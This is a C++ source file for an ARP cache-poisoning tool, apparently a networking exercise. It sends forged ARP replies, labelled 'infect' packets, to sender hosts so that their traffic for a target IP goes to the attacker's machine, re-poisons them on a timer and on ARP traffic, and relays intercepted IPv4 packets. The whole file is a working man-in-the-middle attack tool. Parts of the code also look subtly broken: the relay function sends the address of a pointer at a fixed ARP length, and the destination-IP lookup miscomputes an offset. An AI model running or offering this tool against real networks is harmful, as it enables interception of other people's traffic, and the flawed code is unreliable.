#include <cstdio>
#include <iostream>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <algorithm>
#pragma pack(push, 1)
#define SUCCESS 0
#define FAIL -1
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
typedef struct info {
    Ip target_ip=Ip(0);
    Ip sender_ip=Ip(0);
    Mac target_mac=Mac::nullMac();
    Mac sender_mac=Mac::nullMac();
    EthArpPacket infect_packet;
}info;
bool operator < (info x, info y)
{
    if(x.sender_mac<y.sender_mac) return x.target_mac<y.target_mac;
    return x.sender_mac<y.sender_mac;
}
#pragma pack(pop)
Ip attacker_ip;
Mac attacker_mac;
std::vector<info> info_vector;
void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}
int get_attacker_ip(char* dev)
{
    struct ifreq ifr;
    uint8_t ip_arr[Ip::SIZE];
    int sockfd=socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Failed to get attacker's IP! (reason : socket() failed)\n");
        return FAIL;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    int ret=ioctl(sockfd,SIOCGIFADDR, &ifr);
    if(ret<0) {
        printf("Failed to get attacker's IP! (reason : ioctl() failed\n)");
        close(sockfd);
        return FAIL;
    }
    memcpy(ip_arr, ifr.ifr_addr.sa_data+2, Ip::SIZE);
    attacker_ip=(ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
    close(sockfd);
    return SUCCESS;
}

int get_attacker_mac(char* dev)
{
    struct ifreq ifr;
    int sockfd=socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Failed to get attacker's MAC! (reason : socket() failed)\n");
        return FAIL;
    }
    ifr.ifr_addr.sa_family=AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    int ret=ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret<0) {
        printf("Failed to get attacker's MAC! (reason : ioctl() failed)\n");
        close(sockfd);
        return FAIL;
    }
    uint8_t mac[Mac::SIZE];
    memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    attacker_mac=Mac(mac);
    close(sockfd);
    return SUCCESS;
}
EthArpPacket get_packet(Ip sender_ip)
{
    EthArpPacket packet;
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(Ip(attacker_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);
    return packet;
}
int get_mac_by_ip(char* dev, Ip sender_ip, uint8_t* mac)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if(handle == nullptr) {
        printf("Failed to get MAC! (reason : couldn't open device %s - %s)\n",dev,errbuf);
        return FAIL;
    }
    EthArpPacket packet=get_packet(sender_ip);
    struct pcap_pkthdr* packet_hdr;
    const u_char* temp_packet;
    EthArpPacket* recv_packet;
    while(1) {
        int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket));
        if(ret!=0) {
            printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
            return FAIL;
        }
        ret=pcap_next_ex(handle, &packet_hdr, &temp_packet);
        if(ret==0) continue;
        if(ret<0) {
            printf("Failed to get MAC! (reason : pcap_next_ex return %d error=%s)\n",ret,pcap_geterr(handle));
            return FAIL;
        }
        recv_packet=(EthArpPacket*)temp_packet;
        if(recv_packet->eth_.type_!=htons(EthHdr::Arp)) continue;
        if(recv_packet->arp_.op_!=htons(ArpHdr::Reply)) continue;
        if(recv_packet->arp_.sip_!=packet.arp_.tip_) continue;
        if(recv_packet->arp_.tip_!=packet.arp_.sip_) continue;
        memcpy(mac, &recv_packet->arp_.smac_, Mac::SIZE);
        break;
    }
    return SUCCESS;
}
EthArpPacket get_infect_packet(Ip target_ip, Ip sender_ip, Mac sender_mac)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);
    return packet;
}
int get_info(char* dev, Ip sender_ip, Ip target_ip, info* Case_info)
{
    uint8_t mac_arr[Mac::SIZE];
    int ret=get_mac_by_ip(dev, sender_ip, mac_arr);
    if(ret<0) return FAIL;
    Mac sender_mac=Mac(mac_arr);
    ret=get_mac_by_ip(dev, target_ip, mac_arr);
    if(ret<0) return FAIL;
    Mac target_mac=Mac(mac_arr);
    Case_info->target_ip=target_ip;
    Case_info->sender_ip=sender_ip;
    Case_info->target_mac=target_mac;
    Case_info->sender_mac=sender_mac;
    Case_info->infect_packet=get_infect_packet(target_ip, sender_ip, sender_mac);
    return SUCCESS;
}
void arp_infect(pcap_t* handle)
{
    while(1) {
        for(auto info : info_vector) {
            int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&info.infect_packet), sizeof(EthArpPacket));
            if(ret!=0) printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
        }
        sleep(10);
    }
    return;
}
int arp_relay(pcap_t* handle, const u_char* temp_packet, Mac target_mac)
{
    EthArpPacket* recv_packet=(EthArpPacket*)temp_packet;
    recv_packet->eth_.smac_=attacker_mac;
    recv_packet->eth_.dmac_=target_mac;
    int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&recv_packet), sizeof(EthArpPacket));
    if(ret!=0) {
        printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
        return FAIL;
    }
    return SUCCESS;
}
int main(int argc, char* argv[]) {
    if(argc<4||argc&1) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if(handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    int ret=get_attacker_ip(dev);
    if(ret==FAIL) return -1;
    ret=get_attacker_mac(dev);
    if(ret==FAIL) return -1;
    std::cout << "attacker ip : " << std::string(attacker_ip) << ", attacker mac : " << std::string(attacker_mac) << '\n';
    int cnt=(argc-2)/2;
    for(int i = 1; i <= cnt; i++) {
        printf("Case num : %d\n",i);
        Ip sender_ip=Ip(argv[2*i]);
        Ip target_ip=Ip(argv[2*i+1]);
        info Case_info;
        ret=get_info(dev, sender_ip, target_ip, &Case_info);
        if(ret==FAIL) break;
        info_vector.push_back(Case_info);
        std::cout << "sender ip : " << std::string(Case_info.sender_ip) << ", sender mac : " << std::string(Case_info.sender_mac) << '\n';
        std::cout << "target ip : " << std::string(Case_info.target_ip) << ", target mac : " << std::string(Case_info.target_mac) << '\n';
    }
    std::sort(info_vector.begin(), info_vector.end());
    std::thread arp_infect_thread(arp_infect, handle);
    struct pcap_pkthdr* packet_hdr;
    const u_char* temp_packet;
    EthArpPacket* recv_packet;
    while(1) {
        ret=pcap_next_ex(handle, &packet_hdr, &temp_packet);
        if(ret==0) continue;
        if(ret<0) {
            printf("Failed to get sender's MAC! (reason : pcap_next_ex return %d error=%s)\n",ret,pcap_geterr(handle));
            return -1;
        }
        recv_packet=(EthArpPacket*)temp_packet;
        info temp;
        //printf("eth type : %u\nhtons(Ip4) : %u, htons(Arp) : %u\n",recv_packet->eth_.type(),htons(EthHdr::Ip4),htons(EthHdr::Arp));
        if(recv_packet->eth_.type()==EthHdr::Ip4) {
            temp.sender_mac=recv_packet->eth_.smac_;
            Ip dip=Ip(ntohl(*((uint32_t*)(recv_packet+sizeof(EthHdr)+16))));
            auto it=std::lower_bound(info_vector.begin(), info_vector.end(), temp);
            for(; it!=info_vector.end(); it++) {
                info packet_info=*it;
                if(packet_info.sender_mac!=recv_packet->eth_.smac_) break;
                if(recv_packet->eth_.dmac_!=attacker_mac||dip!=packet_info.target_ip) continue;
                std::cout << "Relay Packet\nsender_ip : " << std::string(packet_info.sender_ip) << ", sender_mac : " << std::string(packet_info.sender_mac) << '\n';
                std::cout << "target_ip : " << std::string(packet_info.target_ip) << ", target_mac : " << std::string(packet_info.target_mac) << '\n';
                ret=arp_relay(handle, temp_packet, packet_info.target_mac);
                if(ret<0) return -1;
            }
        }
        else if(recv_packet->eth_.type()==EthHdr::Arp) {
            temp.sender_mac=recv_packet->arp_.smac_;
            auto it=std::lower_bound(info_vector.begin(), info_vector.end(), temp);
            for(; it!=info_vector.end(); it++) {
                info packet_info=*it;
                if(packet_info.sender_mac!=recv_packet->arp_.smac_) break;
                std::cout << "We will send arp infection packet!\nsender_ip : " << std::string(packet_info.sender_ip) << ", sender_mac : " << std::string(packet_info.sender_mac) << '\n';
                std::cout << "target_ip : " << std::string(packet_info.target_ip) << ", target_mac : " << std::string(packet_info.target_mac) << '\n';
                ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet_info.infect_packet), sizeof(EthArpPacket));
                if(ret!=0) {
                    printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
                    return -1;
                }
            }
        }
    }
    pcap_close(handle);
    return 0;
}
